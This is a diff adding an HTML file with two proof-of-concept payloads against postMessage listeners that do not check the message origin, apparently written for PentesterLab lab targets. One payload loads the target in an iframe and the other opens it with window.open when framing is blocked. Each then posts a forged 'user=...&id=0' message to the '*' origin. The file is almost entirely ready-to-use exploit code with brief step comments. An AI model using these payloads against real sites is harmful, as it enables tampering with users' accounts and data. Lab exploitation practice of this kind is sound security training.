@@ -1,0 +1,30 @@
+<!-- Payload 1 --> 
+<html>
+	<head>
+		<script>
+			//  Step 1: Send the Message Via PostMessage
+			function hack(){
+				setTimeout(function(){document.getElementById("iframe").contentWindow.postMessage('user=omar&id=0','*');},2000);
+			};
+		</script>
+	</head>
+	<body>
+		<!-- Step 2: open the Vulnerable URL via iframe-->
+		<iframe id="iframe" onload="hack()" src="http://ptl-1a868336-ffdc6e91.libcurl.so/"></iframe>
+	</body>
+</html>
+
+
+<!-- Payload 2 --> 
+<!-- when a listener does not filter the origin and X-Frame-Options is used -->
+
+<html>
+  <body>
+      <script>
+      // Step 1: open the Vulnerable URL via window.open
+      var w=window.open("http://ptl-fb81e484-cf16ae2c.libcurl.so/","hack")
+      // Step 2: Send the Message Via PostMessage
+      setTimeout(function(){w.postMessage('user=hacker&id=0','*');},2000);
+      </script>
+  </body>
+</html>
